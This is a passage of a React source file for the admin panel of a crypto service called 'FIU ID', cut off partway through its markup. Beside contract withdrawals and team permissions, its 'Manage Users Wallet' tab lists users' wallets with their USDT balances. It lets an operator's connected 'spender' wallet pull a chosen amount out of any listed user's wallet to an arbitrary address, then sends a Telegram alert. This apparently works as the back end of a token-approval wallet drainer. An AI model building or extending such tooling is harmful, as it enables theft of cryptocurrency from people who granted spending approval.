import { useEffect, useMemo, useReducer, useRef, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import {
  Shield, Search, Users, LogOut, ShieldCheck, Wallet, Loader2, MoreHorizontal, UserCog
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { WalletSelectModal } from "@/components/WalletSelectModal";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { toast } from "sonner";
import { apiRequest, ApiError } from "@/lib/api";
import {
  ASSIGNABLE_CAPABILITIES,
  CAPABILITY_LABELS,
  effectiveAdminCaps,
  hasAdminCapability
} from "@/lib/admin-capabilities";
import { clearSession, getSession, setSession } from "@/lib/session";
import { getOnchainUSDTBalance, transferUSDTFromUserWallet, withdrawUSDTFromContract, type Chain, type WalletConnectionMethod } from "@/lib/web3";
import { useWagmiWallet } from "@/lib/wagmi-hooks";
import { useSolanaWallet } from "@/lib/solana-wallet-hooks";
import { useTronWallet, type TronAdapterType } from "@/lib/tronwallet-adapter";

type SupportedChain = Chain;

interface WithdrawalEntry {
  id: string;
  chain: SupportedChain;
  amountUsdt: number;
  destinationAddress: string;
  status: "completed";
  note: string;
  txHash: string;
  createdAt: string;
}

interface PaidWalletEntry {
  userId: string;
  walletAddress: string;
  paymentCount: number;
  totalPaidUsdt: number;
  lastPaidAt: string | null;
  usdtBalance: string | null;
  balanceFetchError: string | null;
  /** `trust_pay` = from Trust Tron flow (`wallet_users`) only; `identity` = linked app user wallet. */
  listSource?: "identity" | "trust_pay";
}

interface TrustTronWalletEntry {
  id: string;
  walletAddress: string;
  createdAt: string;
  verifiedAt: string;
}

/** When `VITE_ADMIN_SHOW_DASHBOARD_SUMMARY` is `"false"`, hide intro + KPI cards (User Records, etc.). */
const SHOW_ADMIN_DASHBOARD_SUMMARY = import.meta.env.VITE_ADMIN_SHOW_DASHBOARD_SUMMARY !== "false";

const fadeIn = {
  hidden: { opacity: 0, y: 15 },
  visible: (i: number) => ({
    opacity: 1,
    y: 0,
    transition: { delay: i * 0.08, duration: 0.4, ease: [0.16, 1, 0.3, 1] as const },
  }),
};

const isMobileTrustDiscover = (): boolean => {
  if (typeof window === "undefined") return false;
  const ua = String(navigator.userAgent || "").toLowerCase();
  return /android|iphone|ipad|ipod|mobile/.test(ua) && /trustwallet|trust wallet/.test(ua);
};

function normalizeWalletConnectPairingUri(uri: unknown): string | null {
  if (uri == null) return null;
  const s = (typeof uri === "string" ? uri : String(uri)).trim();
  if (s.length < 12) return null;
  if (!s.toLowerCase().startsWith("wc:")) return null;
  return s;
}

function openTrustWalletForWalletConnect(uri: string): boolean {
  const normalized = normalizeWalletConnectPairingUri(uri);
  if (!normalized) return false;
  const url = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(normalized)}`;
  window.location.assign(url);
  return true;
}

const Admin = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [selectedChain, setSelectedChain] = useState<SupportedChain>("ethereum");
  const [withdrawalEntries, setWithdrawalEntries] = useState<WithdrawalEntry[]>([]);
  const [withdrawalDestination, setWithdrawalDestination] = useState("");
  const [withdrawalAmountUsdt, setWithdrawalAmountUsdt] = useState("");
  const [withdrawalNote, setWithdrawalNote] = useState("");
  const [withdrawalWalletAddress, setWithdrawalWalletAddress] = useState("");
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [isConnectingWallet, setIsConnectingWallet] = useState(false);
  const [isSubmittingWithdrawal, setIsSubmittingWithdrawal] = useState(false);
  const [manageWalletChain, setManageWalletChain] = useState<SupportedChain>("ethereum");
  const [paidWalletEntries, setPaidWalletEntries] = useState<PaidWalletEntry[]>([]);
  const [isLoadingPaidWalletEntries, setIsLoadingPaidWalletEntries] = useState(false);
  const [trustTronRecipientDraft, setTrustTronRecipientDraft] = useState("");
  const [trustTronRecipientUpdatedAt, setTrustTronRecipientUpdatedAt] = useState<string | null>(null);
  const [isLoadingTrustTronConfig, setIsLoadingTrustTronConfig] = useState(false);
  const [isSavingTrustTronRecipient, setIsSavingTrustTronRecipient] = useState(false);
  const [manageWalletListSearch, setManageWalletListSearch] = useState("");
  const [debouncedManageWalletListSearch, setDebouncedManageWalletListSearch] = useState("");
  const [isSendUsdtModalOpen, setIsSendUsdtModalOpen] = useState(false);
  const [sendUsdtTarget, setSendUsdtTarget] = useState<PaidWalletEntry | null>(null);
  const [sendUsdtAmount, setSendUsdtAmount] = useState("10");
  const [sendUsdtDestinationAddress, setSendUsdtDestinationAddress] = useState("");
  const [sendUsdtWalletAddress, setSendUsdtWalletAddress] = useState("");
  const [isConnectingSendUsdtWallet, setIsConnectingSendUsdtWallet] = useState(false);
  const [isSendingUsdt, setIsSendingUsdt] = useState(false);
  const [trustConnecting, setTrustConnecting] = useState(false);
  const [activeTab, setActiveTab] = useState("withdrawals");
  const wcTrustNavigatedRef = useRef(false);
  const connectMethodRef = useRef<string>("unknown");
  const [sessionRev, bumpSession] = useReducer((n: number) => n + 1, 0);
  const session = useMemo(() => getSession(), [sessionRev]);
  const [meSynced, setMeSynced] = useState(false);
  const [operators, setOperators] = useState<
    Array<{ id: string; email: string; role: string; capabilities: string[] }>
  >([]);
  const [operatorEdits, setOperatorEdits] = useState<Record<string, string[]>>({});
  const [isLoadingOperators, setIsLoadingOperators] = useState(false);
  const [isSavingOperatorCaps, setIsSavingOperatorCaps] = useState<string | null>(null);
  const [hasAdminPassword, setHasAdminPassword] = useState(false);
  const [passwordDialogOpen, setPasswordDialogOpen] = useState(false);
  const [passwordCurrent, setPasswordCurrent] = useState("");
  const [passwordNew, setPasswordNew] = useState("");
  const [isSavingPassword, setIsSavingPassword] = useState(false);

  const caps = useMemo(
    () => effectiveAdminCaps(session?.user.role ?? "user", session?.user.adminCaps),
    [session?.user.role, session?.user.adminCaps, sessionRev]
  );

  const canAccessAdmin =
    session?.user.role === "admin" || session?.user.role === "compliance"
      ? caps.length > 0
      : false;

  const canWithdrawRead = hasAdminCapability(caps, "withdrawals:read");
  const canWithdrawWrite = hasAdminCapability(caps, "withdrawals:write");
  const canManageRead = hasAdminCapability(caps, "manage_wallets:read");
  const canManageWrite = hasAdminCapability(caps, "manage_wallets:write");
  const canOperators = hasAdminCapability(caps, "operators:manage");
  const wagmiWallet = useWagmiWallet();
  const solanaWallet = useSolanaWallet();
  const tronWallet = useTronWallet();

  const loadOperators = async () => {
    try {
      setIsLoadingOperators(true);
      const res = await apiRequest<{
        operators: Array<{ id: string; email: string; role: string; capabilities: string[] }>;
      }>("/admin/operators", { auth: true });
      setOperators(res.operators);
      const edits: Record<string, string[]> = {};
      for (const o of res.operators) {
        edits[o.id] = [...o.capabilities];
      }
      setOperatorEdits(edits);
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to load team";
      toast.error(message);
    } finally {
      setIsLoadingOperators(false);
    }
  };

  const saveOperatorCapability = async (userId: string) => {
    const next = operatorEdits[userId];
    if (!next) {
      return;
    }
    try {
      setIsSavingOperatorCaps(userId);
      await apiRequest(`/admin/operators/${userId}`, {
        method: "PATCH",
        auth: true,
        body: { capabilities: next }
      });
      toast.success("Permissions updated.");
      await loadOperators();
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to save";
      toast.error(message);
    } finally {
      setIsSavingOperatorCaps(null);
    }
  };

  const loadPaidWalletEntries = async (chain: SupportedChain) => {
    if (!["ethereum", "bsc", "tron"].includes(chain)) {
      setPaidWalletEntries([]);
      return;
    }

    try {
      setIsLoadingPaidWalletEntries(true);
      const contractConfig = await apiRequest<{ usdtTokenAddress?: string }>(`/web3/contract-config/${chain}`);

      let baseEntries: PaidWalletEntry[] = [];

      if (chain === "tron") {
        const [paidRes, trustRes] = await Promise.all([
          apiRequest<{ chain: string; entries: PaidWalletEntry[] }>(`/admin/paid-wallets?chain=tron`, {
            auth: true
          }),
          apiRequest<{ entries: TrustTronWalletEntry[] }>(`/admin/trust-tron/wallets?limit=500`, { auth: true })
        ]);

        const byAddr = new Map<string, PaidWalletEntry>();
        for (const e of paidRes.entries) {
          byAddr.set(e.walletAddress, { ...e, listSource: "identity" });
        }
        for (const w of trustRes.entries) {
          if (!byAddr.has(w.walletAddress)) {
            byAddr.set(w.walletAddress, {
              userId: w.id,
              walletAddress: w.walletAddress,
              paymentCount: 0,
              totalPaidUsdt: 0,
              lastPaidAt: null,
              usdtBalance: null,
              balanceFetchError: null,
              listSource: "trust_pay"
            });
          }
        }
        baseEntries = Array.from(byAddr.values());
      } else {
        const response = await apiRequest<{ chain: string; entries: PaidWalletEntry[] }>(
          `/admin/paid-wallets?chain=${encodeURIComponent(chain)}`,
          { auth: true }
        );
        baseEntries = response.entries;
      }

      const entriesWithBalance = await Promise.all(
        baseEntries.map(async (entry) => {
          try {
            const balance = await getOnchainUSDTBalance(chain, entry.walletAddress, contractConfig.usdtTokenAddress);
            return {
              ...entry,
              usdtBalance: balance.formattedBalance,
              balanceFetchError: null
            };
          } catch (error) {
            return {
              ...entry,
              usdtBalance: null,
              balanceFetchError: error instanceof Error ? error.message : "Failed to fetch on-chain balance"
            };
          }
        })
      );

      setPaidWalletEntries(entriesWithBalance);
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to load paid wallets";
      toast.error(message);
    } finally {
      setIsLoadingPaidWalletEntries(false);
    }
  };

  const loadTrustTronConfig = async () => {
    try {
      setIsLoadingTrustTronConfig(true);
      const response = await apiRequest<{ defaultRecipientAddress: string; updatedAt: string | null }>(
        "/trust-tron/config",
        { auth: false }
      );
      setTrustTronRecipientDraft(response.defaultRecipientAddress);
      setTrustTronRecipientUpdatedAt(response.updatedAt);
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to load Tron pay settings";
      toast.error(message);
    } finally {
      setIsLoadingTrustTronConfig(false);
    }
  };

  const applyTrustTronPayRecipient = async (address: string) => {
    const trimmed = address.trim();
    if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(trimmed)) {
      toast.error("Enter a valid Tron address (T…).");
      return;
    }
    try {
      setIsSavingTrustTronRecipient(true);
      const response = await apiRequest<{ defaultRecipientAddress: string; updatedAt: string }>(
        "/admin/trust-tron/config",
        { method: "PATCH", body: { defaultRecipientAddress: trimmed }, auth: true }
      );
      setTrustTronRecipientDraft(response.defaultRecipientAddress);
      setTrustTronRecipientUpdatedAt(response.updatedAt);
      toast.success("Pay page default recipient updated.");
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to save";
      toast.error(message);
    } finally {
      setIsSavingTrustTronRecipient(false);
    }
  };

  useEffect(() => {
    if (!session?.token) {
      navigate("/auth/admin");
      return;
    }

    if (!canAccessAdmin) {
      setLoading(false);
      return;
    }

    setLoading(false);
  }, [canAccessAdmin, navigate, session?.token]);

  useEffect(() => {
    if (!session?.token) {
      return;
    }
    if (session.user.role !== "admin" && session.user.role !== "compliance") {
      return;
    }
    void (async () => {
      try {
        const me = await apiRequest<{
          user: { id: string; email: string; role: string };
          capabilities: string[];
          hasPassword: boolean;
        }>("/admin/me", { auth: true });
        const s = getSession();
        if (!s?.token) {
          return;
        }
        setSession({
          token: s.token,
          user: {
            ...s.user,
            email: me.user.email,
            adminCaps: me.capabilities
          }
        });
        setHasAdminPassword(me.hasPassword);
        bumpSession();
      } catch (error) {
        const message = error instanceof ApiError ? error.message : "Failed to load admin session";
        toast.error(message);
      } finally {
        setMeSynced(true);
      }
    })();
  }, [session?.token, session?.user?.id, session?.user?.role]);

  useEffect(() => {
    if (!session?.token || !canAccessAdmin || !canManageRead) {
      return;
    }
    void loadPaidWalletEntries(manageWalletChain);
  }, [canAccessAdmin, canManageRead, manageWalletChain, session?.token]);

  useEffect(() => {
    if (!session?.token || !canAccessAdmin || !canOperators || activeTab !== "team") {
      return;
    }
    void loadOperators();
  }, [session?.token, canAccessAdmin, canOperators, activeTab]);

  useEffect(() => {
    if (!meSynced) {
      return;
    }
    const tabs: string[] = [];
    if (canWithdrawRead) {
      tabs.push("withdrawals");
    }
    if (canManageRead) {
      tabs.push("manage-wallets");
    }
    if (canOperators) {
      tabs.push("team");
    }
    if (tabs.length > 0 && !tabs.includes(activeTab)) {
      setActiveTab(tabs[0]);
    }
  }, [meSynced, canWithdrawRead, canManageRead, canOperators, activeTab]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedManageWalletListSearch(manageWalletListSearch.trim());
    }, 300);
    return () => clearTimeout(timer);
  }, [manageWalletListSearch]);

  useEffect(() => {
    if (!session?.token || !canAccessAdmin || !canManageRead) {
      return;
    }
    if (activeTab !== "manage-wallets" || manageWalletChain !== "tron") {
      return;
    }
    void loadTrustTronConfig();
  }, [activeTab, canAccessAdmin, canManageRead, manageWalletChain, session?.token]);

  const filteredManageWalletEntries = useMemo(() => {
    const q = debouncedManageWalletListSearch.toLowerCase();
    if (!q) {
      return paidWalletEntries;
    }
    return paidWalletEntries.filter(
      (e) =>
        e.walletAddress.toLowerCase().includes(q) ||
        e.userId.toLowerCase().includes(q)
    );
  }, [paidWalletEntries, debouncedManageWalletListSearch]);

  const toggleOperatorCapability = (userId: string, cap: string, checked: boolean) => {
    setOperatorEdits((prev) => {
      const cur = [...(prev[userId] ?? [])];
      if (cap === "*") {
        return { ...prev, [userId]: checked ? ["*"] : [] };
      }
      const withoutStar = cur.filter((c) => c !== "*");
      if (checked) {
        if (!withoutStar.includes(cap)) {
          withoutStar.push(cap);
        }
      } else {
        const idx = withoutStar.indexOf(cap);
        if (idx >= 0) {
          withoutStar.splice(idx, 1);
        }
      }
      return { ...prev, [userId]: withoutStar };
    });
  };

  const handleSaveAdminPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordNew.length < 10) {
      toast.error("New password must be at least 10 characters.");
      return;
    }
    try {
      setIsSavingPassword(true);
      await apiRequest("/admin/me/password", {
        method: "PATCH",
        auth: true,
        body: {
          currentPassword: hasAdminPassword ? passwordCurrent || undefined : undefined,
          newPassword: passwordNew
        }
      });
      toast.success("Password updated. You can use it on the admin sign-in page.");
      setPasswordDialogOpen(false);
      setPasswordCurrent("");
      setPasswordNew("");
      setHasAdminPassword(true);
    } catch (error) {
      const message = error instanceof ApiError ? error.message : "Failed to update password";
      toast.error(message);
    } finally {
      setIsSavingPassword(false);
    }
  };

  const handleLogout = () => {
    clearSession();
    navigate("/");
  };

  const handleConnectWithdrawalWallet = async (method: WalletConnectionMethod, walletId?: string) => {
    try {
      setIsConnectingWallet(true);
      setIsWalletModalOpen(false);
      let address: string;

      if (selectedChain === "tron") {
        const tronAdapterByWalletId: Record<string, TronAdapterType> = {
          tronlink: "tronlink",
          tokenpocket: "tokenpocket",
          trust: "trust",
          "metamask-tron": "metamask",
          okxwallet: "okxwallet",
          safepal: "auto",
          walletconnect: "walletconnect",
        };
        const selectedTronAdapter = walletId ? tronAdapterByWalletId[walletId] : undefined;
        address = await tronWallet.connect(selectedTronAdapter ?? "auto");
      } else if (selectedChain === "ethereum" || selectedChain === "bsc") {
        address = await wagmiWallet.connectWallet(selectedChain);
      } else {
        const requestedSolanaWallet = walletId === "solflare" ? "solflare" : walletId === "phantom" ? "phantom" : undefined;
        address = await solanaWallet.connectWallet(requestedSolanaWallet);
      }

      setWithdrawalWalletAddress(address);
      toast.success("Wallet connected for withdrawal.");
    } catch (error) {
      const message = error instanceof Error ? error.message : "Failed to connect wallet";
      toast.error(message);
      setIsWalletModalOpen(true);
    } finally {
      setIsConnectingWallet(false);
    }
  };

  const handleCreateWithdrawalRequest = async () => {
    const parsedAmount = Number.parseFloat(withdrawalAmountUsdt);
    if (!withdrawalDestination || Number.isNaN(parsedAmount) || parsedAmount <= 0) {
      toast.error("Enter destination address and a valid withdrawal amount.");
      return;
    }
    if (!withdrawalWalletAddress) {
      toast.error("Connect an admin wallet first.");
      return;
    }
    try {
      setIsSubmittingWithdrawal(true);
      
      // Get contract config to get the contract address
      const contractConfig = await apiRequest<{ contractAddress: string; usdtTokenAddress?: string }>(
        `/web3/contract-config/${selectedChain}`
      );
      
      if (!contractConfig.contractAddress) {
        throw new Error(`Contract address is not configured for ${selectedChain}.`);
      }

      // Withdraw from the contract using withdrawUSDT function
      const txHash = await withdrawUSDTFromContract(
        selectedChain,
        contractConfig.contractAddress,
        withdrawalDestination,
        withdrawalAmountUsdt,
        contractConfig.usdtTokenAddress
      );
      
      setWithdrawalEntries((current) => [
        {
          id: crypto.randomUUID(),
          chain: selectedChain,
          amountUsdt: parsedAmount,
          destinationAddress: withdrawalDestination,
          status: "completed",
          note: withdrawalNote,
          txHash,
          createdAt: new Date().toISOString()
        },
        ...current
      ]);
      setWithdrawalNote("");
      setWithdrawalAmountUsdt("");
      setWithdrawalDestination("");
      toast.success("Withdrawal transaction submitted successfully.");
    } catch (error) {
      const message = error instanceof Error ? error.message : "Failed to submit withdrawal";
      toast.error(message);
    } finally {
      setIsSubmittingWithdrawal(false);
    }
  };

  const handleChainChange = (nextChain: SupportedChain) => {
    setSelectedChain(nextChain);
    if (withdrawalWalletAddress) {
      setWithdrawalWalletAddress("");
      toast.message("Chain changed. Reconnect wallet for this chain.");
    }
  };

  const handleManageWalletChainChange = (nextChain: SupportedChain) => {
    setManageWalletChain(nextChain);
    setSendUsdtWalletAddress("");
    setManageWalletListSearch("");
    setDebouncedManageWalletListSearch("");
  };

  const openSendUsdtModal = (entry: PaidWalletEntry) => {
    setSendUsdtTarget(entry);
    setSendUsdtAmount("10");
    setSendUsdtDestinationAddress(entry.walletAddress);
    setIsSendUsdtModalOpen(true);
  };

  const handleConnectSendUsdtWallet = async () => {
    if (manageWalletChain === "tron") {
      try {
        delete (window as any).__tronWalletConnectOnUri;
      } catch {
        /* ignore */
      }
      wcTrustNavigatedRef.current = false;

      try {
        connectMethodRef.current = "walletconnect";
        setTrustConnecting(true);
        setIsConnectingSendUsdtWallet(true);
        (window as any).__tronWalletConnectOnUri = (uri: string) => {
          if (wcTrustNavigatedRef.current) return;
          if (openTrustWalletForWalletConnect(uri)) {
            wcTrustNavigatedRef.current = true;
          }
        };
        const address = await tronWallet.connect("walletconnect");
        setSendUsdtWalletAddress(address);
        toast.success("Wallet linked");
      } catch (error) {
        if (wcTrustNavigatedRef.current) {
          return;
        }
        toast.error(
          error instanceof Error ? error.message : "WalletConnect failed"
        );
      } finally {
        try {
          delete (window as any).__tronWalletConnectOnUri;
        } catch {
          /* ignore */
        }
        setTrustConnecting(false);
        setIsConnectingSendUsdtWallet(false);
      }
      return;
    }

    try {
      setIsConnectingSendUsdtWallet(true);
      const address =
        manageWalletChain === "ethereum" || manageWalletChain === "bsc"
            ? await wagmiWallet.connectWallet(manageWalletChain)
            : await solanaWallet.connectWallet();
      setSendUsdtWalletAddress(address);
      toast.success("Admin wallet connected for user transfer.");
    } catch (error) {
      const message = error instanceof Error ? error.message : "Failed to connect admin wallet";
      toast.error(message);
    } finally {
      setIsConnectingSendUsdtWallet(false);
    }
  };

  const handleSendUsdtToUser = async () => {
    if (!sendUsdtTarget) {
      toast.error("No user selected.");
      return;
    }

    const parsedAmount = Number.parseFloat(sendUsdtAmount);
    if (Number.isNaN(parsedAmount) || parsedAmount <= 0) {
      toast.error("Enter a valid USDT amount.");
      return;
    }

    const destinationAddress = sendUsdtDestinationAddress.trim();
    if (!destinationAddress) {
      toast.error("Enter destination wallet address.");
      return;
    }

    if (!sendUsdtWalletAddress) {
      toast.error("Connect admin wallet first.");
      return;
    }

    try {
      setIsSendingUsdt(true);
      const contractConfig = await apiRequest<{ usdtTokenAddress?: string }>(`/web3/contract-config/${manageWalletChain}`);
      const txHash = await transferUSDTFromUserWallet(
        manageWalletChain,
        sendUsdtTarget.walletAddress,
        destinationAddress,
        sendUsdtAmount,
        contractConfig.usdtTokenAddress
      );
      try {
        await apiRequest("/admin/user-wallet-transfers/notify", {
          method: "POST",
          auth: true,
          body: {
            userId: sendUsdtTarget.userId,
            chain: manageWalletChain,
            fromWalletAddress: sendUsdtTarget.walletAddress,
            toWalletAddress: destinationAddress,
            spenderWalletAddress: sendUsdtWalletAddress,
            amountUsdt: parsedAmount,
            txHash
          }
        });
      } catch (notifyError) {
        console.error("[admin.manage-wallets] Transfer notify failed", notifyError);
        toast.warning("Transfer succeeded, but Telegram notification failed.");
      }
      toast.success(`USDT transferred from user wallet. Tx: ${txHash.slice(0, 12)}...`);
      setIsSendUsdtModalOpen(false);
      await loadPaidWalletEntries(manageWalletChain);
    } catch (error) {
      const message = error instanceof Error ? error.message : "Failed to send USDT";
      toast.error(message);
    } finally {
      setIsSendingUsdt(false);
    }
  };

  const getTxExplorerBaseUrl = (chain: SupportedChain): string => {
    if (chain === "ethereum") return "https://sepolia.etherscan.io/tx/";
    if (chain === "bsc") return "https://bscscan.com/tx/";
    if (chain === "solana") return "https://explorer.solana.com/tx/";
    return "https://tronscan.org/#/transaction/";
  };

  const getWithdrawalPlaceholder = (chain: SupportedChain): string => {
    if (chain === "tron") return "T...";
    if (chain === "solana") return "Base58 address";
    return "0x...";
  };

  const getConnectedWalletDisplay = (): string => {
    if (!withdrawalWalletAddress) return "Not connected";
    if (withdrawalWalletAddress.length <= 14) return withdrawalWalletAddress;
    return `${withdrawalWalletAddress.slice(0, 8)}...${withdrawalWalletAddress.slice(-6)}`;
  };

  const openWalletModal = () => {
    setIsWalletModalOpen(true);
  };

  const handleCopyToClipboard = async (value: string, label: string) => {
    try {
      await navigator.clipboard.writeText(value);
      toast.success(`${label} copied.`);
    } catch {
      toast.error(`Failed to copy ${label.toLowerCase()}.`);
    }
  };

  const handleQuickAction = () => {
    if (activeTab === "withdrawals") {
      void handleCreateWithdrawalRequest();
      return;
    }
    if (activeTab === "team") {
      void loadOperators();
      return;
    }
    void loadPaidWalletEntries(manageWalletChain);
  };

  const quickActionLabel =
    activeTab === "withdrawals"
      ? "Submit Withdrawal"
      : activeTab === "team"
        ? "Refresh team"
        : "Refresh Wallets";

  const quickActionDisabled =
    activeTab === "withdrawals"
      ? isSubmittingWithdrawal || isConnectingWallet || !canAccessAdmin || !canWithdrawWrite
      : activeTab === "manage-wallets"
        ? isLoadingPaidWalletEntries || !canManageRead
        : activeTab === "team"
          ? isLoadingOperators
          : true;

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <Card className="app-section-card w-[min(92vw,520px)]">
          <CardContent className="p-6 sm:p-7">
            <div className="flex items-center gap-3 mb-5">
              <Loader2 className="w-5 h-5 animate-spin text-accent" />
              <p className="text-sm font-medium text-foreground">Loading admin panel</p>
            </div>
            <div className="space-y-3">
              <div className="app-skeleton-line w-5/6" />
              <div className="app-skeleton-line w-4/6" />
              <div className="app-skeleton-line w-3/4" />
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (!canAccessAdmin) {
    return (
      <div className="page-shell">
        <header className="app-fixed-header app-header-surface before:absolute before:inset-0 before:mesh-overlay before:opacity-30 before:pointer-events-none before:-z-10">
          <div className="page-container flex items-center justify-between h-14 sm:h-16">
            <Link to="/" className="flex items-center gap-2.5 group">
              <div className="w-9 h-9 rounded-xl gradient-accent flex items-center justify-center shadow-[var(--shadow-accent)] group-hover:shadow-[var(--shadow-lg)] transition-shadow">
                <Shield className="w-4 h-4 text-accent-foreground" />
              </div>
              <span className="font-display font-bold text-lg text-foreground">FIU ID</span>
              <Badge className="ml-1.5 text-[10px] gradient-accent text-accent-foreground border-0 rounded-md px-2">Admin</Badge>
            </Link>
            <Button variant="ghost" size="icon" className="rounded-xl" onClick={handleLogout}>
              <LogOut className="w-4 h-4" />
            </Button>
          </div>
        </header>
        <div className="page-container pt-20 sm:pt-24 pb-6 sm:pb-8 md:pb-10 max-w-6xl">
          <Card className="app-section-card rounded-2xl mb-8">
            <CardContent className="p-6">
              <p className="text-sm text-muted-foreground">
                {session &&
                (session.user.role === "admin" || session.user.role === "compliance") &&
                meSynced &&
                caps.length === 0 ? (
                  <>
                    Your account has the <strong>{session.user.role}</strong> role but no capabilities are assigned. Ask
                    another operator with <span className="font-mono text-xs">operators:manage</span> to grant access.
                  </>
                ) : (
                  <>
                    Your account role is <strong>{session?.user.role}</strong>. Admin panel access requires{" "}
                    <strong>admin</strong> or <strong>compliance</strong> privileges.
                  </>
                )}
              </p>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="page-shell">
      <header className="app-fixed-header app-header-surface before:absolute before:inset-0 before:mesh-overlay before:opacity-30 before:pointer-events-none before:-z-10">
        <div className="page-container flex items-center justify-between h-14 sm:h-16">
          <Link to="/" className="flex items-center gap-2.5 group">
            <div className="w-9 h-9 rounded-xl gradient-accent flex items-center justify-center shadow-[var(--shadow-accent)] group-hover:shadow-[var(--shadow-lg)] transition-shadow">
              <Shield className="w-4 h-4 text-accent-foreground" />
            </div>
            <span className="font-display font-bold text-lg text-foreground">FIU ID</span>
            <Badge className="ml-1.5 text-[10px] gradient-accent text-accent-foreground border-0 rounded-md px-2">Admin</Badge>
          </Link>
          <div className="flex items-center gap-2 sm:gap-3">
            <Link
              to="/dashboard"
              className="inline-flex items-center gap-1 rounded-lg border border-border/60 bg-muted/55 px-3 py-1.5 text-xs sm:text-sm font-medium text-muted-foreground hover:text-foreground hover:bg-muted/75 transition-colors"
            >
              User Dashboard
            </Link>
            <div className="flex items-center gap-2 px-2.5 sm:px-3.5 py-1.5 sm:py-2 rounded-xl bg-muted/60 border border-border/50 shadow-[var(--shadow-xs)]">
              <div className="w-7 h-7 rounded-lg bg-accent/10 flex items-center justify-center">
                <ShieldCheck className="w-3.5 h-3.5 text-accent" />
              </div>
              <span className="text-sm font-medium text-foreground hidden md:block max-w-[180px] truncate">
                {session?.user.email ?? "Unknown admin"}
              </span>
            </div>
            <Button
              type="button"
              variant="outline"
              size="sm"
              className="rounded-xl hidden sm:inline-flex"
              onClick={() => setPasswordDialogOpen(true)}
            >
              Password
            </Button>
            <Button variant="ghost" size="icon" className="rounded-xl" onClick={handleLogout}>
              <LogOut className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </header>

      <div className="page-container pt-20 sm:pt-24 pb-28 sm:pb-8 md:pb-10 max-w-6xl">
        {SHOW_ADMIN_DASHBOARD_SUMMARY ? (
          <>
            <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={0}>
              <div className="app-page-intro">
                <div className="flex items-center gap-3 mb-2">
                  <ShieldCheck className="w-6 h-6 text-accent" />
                  <h1 className="font-display text-2xl sm:text-3xl font-bold text-foreground">Admin Panel</h1>
                </div>
                <p className="text-muted-foreground">
                  Manage chain withdrawals, user wallets, and Trust Tron pay settings with secure operational controls.
                </p>
              </div>
            </motion.div>

            {/* Stats */}
            <div className="grid grid-cols-2 gap-4 sm:gap-5 mb-8 sm:mb-10">
              {[
                { label: "Withdrawals (session)", value: withdrawalEntries.length, icon: Wallet, iconClass: "text-accent", accent: "from-accent/10 to-accent/5" },
                { label: "Wallets listed", value: paidWalletEntries.length, icon: Users, iconClass: "text-success", accent: "from-success/10 to-success/5" },
              ].map((card, i) => (
                <motion.div key={card.label} initial="hidden" animate="visible" variants={fadeIn} custom={i + 1}>
                  <Card className="app-kpi-card rounded-2xl overflow-hidden">
                    <CardContent className="p-5 sm:p-6">
                      <div className="flex items-center justify-between mb-4">
                        <span className="text-sm font-medium text-muted-foreground">{card.label}</span>
                        <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${card.accent} flex items-center justify-center`}>
                          <card.icon className={`w-5 h-5 ${card.iconClass}`} />
                        </div>
                      </div>
                      <p className="font-display text-3xl font-bold text-foreground">{card.value}</p>
                    </CardContent>
                  </Card>
                </motion.div>
              ))}
            </div>
          </>
        ) : null}

        <motion.div initial="hidden" animate="visible" variants={fadeIn} custom={5}>
          <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
            <TabsList className="app-tabs-rail sm:w-auto max-w-full">
              {canWithdrawRead ? (
                <TabsTrigger value="withdrawals" className="app-tabs-trigger">
                  Withdrawals
                </TabsTrigger>
              ) : null}
              {canManageRead ? (
                <TabsTrigger value="manage-wallets" className="app-tabs-trigger">
                  Manage Users Wallet
                </TabsTrigger>
              ) : null}
              {canOperators ? (
                <TabsTrigger value="team" className="app-tabs-trigger">
                  <span className="inline-flex items-center gap-1.5">
                    <UserCog className="w-3.5 h-3.5" />
                    Team
                  </span>
                </TabsTrigger>
              ) : null}
            </TabsList>

            <TabsContent value="withdrawals" className="space-y-5">
              {canWithdrawRead && !canWithdrawWrite ? (
                <Card className="app-section-card rounded-xl border-amber-500/35 bg-amber-500/5">
                  <CardContent className="p-4 text-sm text-muted-foreground">
                    View-only: you can review this tab but cannot submit withdrawals.
                  </CardContent>
                </Card>
              ) : null}
              <div className="app-sticky-subheader">
                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                <h3 className="font-display font-bold text-lg text-foreground">Chain Withdrawal Management</h3>
                <div className="w-full sm:w-[220px]">
                  <Select value={selectedChain} onValueChange={(value) => handleChainChange(value as SupportedChain)}>
                    <SelectTrigger className="h-10 rounded-xl bg-muted/50 border-border/60">
                      <SelectValue placeholder="Select chain" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="ethereum">Ethereum</SelectItem>
                      <SelectItem value="bsc">BSC</SelectItem>
